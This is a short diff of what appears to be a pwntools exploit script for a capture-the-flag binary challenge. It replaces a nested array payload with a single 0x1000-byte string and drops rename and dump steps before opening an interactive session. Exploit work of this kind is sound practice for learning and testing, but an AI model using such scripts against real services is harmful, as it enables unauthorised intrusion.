@@ -87,7 +87,7 @@ def cmd_xxx():
     payload += b"" # payload
     p.send(payload)
 
-
+'''
 array1_1_1 = [
     (DATA_TYPE_STRING, b"a"*0x10),
     (DATA_TYPE_STRING, b"b"*0x10),
@@ -108,11 +108,9 @@ array1 = [
     (DATA_TYPE_ARRAY, len(array1_1), array1_1)
 ]
 cmd_add(make_int(0x1111), make_array(len(array1), array1))
+'''
+cmd_add(make_int(0x1111), make_string(b"a"*0x1000))
 p.recv()
-cmd_rnm(make_int(0x1111), make_int(0x2222))
-p.recv()
-cmd_get(make_int(0x2222))
-p.recv()
-cmd_dump()
+cmd_get(make_int(0x1111))
 p.recv()
 p.interactive()
